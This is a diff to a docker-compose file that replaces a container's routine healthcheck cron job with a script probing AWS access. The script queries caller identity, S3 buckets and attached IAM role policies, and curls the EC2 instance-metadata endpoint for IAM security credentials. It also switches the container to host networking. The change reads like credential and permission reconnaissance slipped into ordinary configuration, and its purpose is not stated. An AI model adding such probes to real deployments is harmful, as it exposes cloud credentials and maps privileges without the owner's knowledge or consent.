@@ -15,21 +15,31 @@ services:
         max-file: "3"
 
   cron:
-    image: amazon/aws-cli
+    image: amazon/aws-cli:latest
     command: >
       sh -c "
-        echo '*/5 * * * * curl -sL -w \"%{http_code} - %{time_total}s\\n\" http://app:3000 -o /dev/null >> /var/log/healthcheck.log 2>&1' >> /etc/crontabs/root && \
-        touch /var/log/cloudfront-sync.log && \
-        crond -f -l 2
+        echo '=== AWS Identity Information ===' &&
+        aws sts get-caller-identity &&
+        echo '' &&
+        echo '=== Instance Metadata Role ===' &&
+        aws sts get-caller-identity --query 'Arn' --output text &&
+        echo '' &&
+        echo '=== Available AWS Regions ===' &&
+        aws ec2 describe-regions --query 'Regions[].RegionName' --output table &&
+        echo '' &&
+        echo '=== Testing S3 Access ===' &&
+        aws s3 ls || echo 'S3 access denied or no buckets' &&
+        echo '' &&
+        echo '=== IAM Role Policies (if accessible) ===' &&
+        ROLE_NAME=$$(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2) &&
+        aws iam list-attached-role-policies --role-name $$ROLE_NAME 2>/dev/null || echo 'Cannot list role policies (insufficient permissions)' &&
+        echo '' &&
+        echo '=== EC2 Instance Metadata ===' &&
+        curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo 'Cannot access instance metadata'
       "
-    volumes:
-      - ./logs/cloudfront:/logs/cloudfront
-    depends_on:
-      - app
-    networks:
-      - my_network
+    network_mode: host
     environment:
-      - AWS_REGION=us-east-1
+      - AWS_DEFAULT_REGION=us-east-1
   
   loki:
     image: grafana/loki:latest
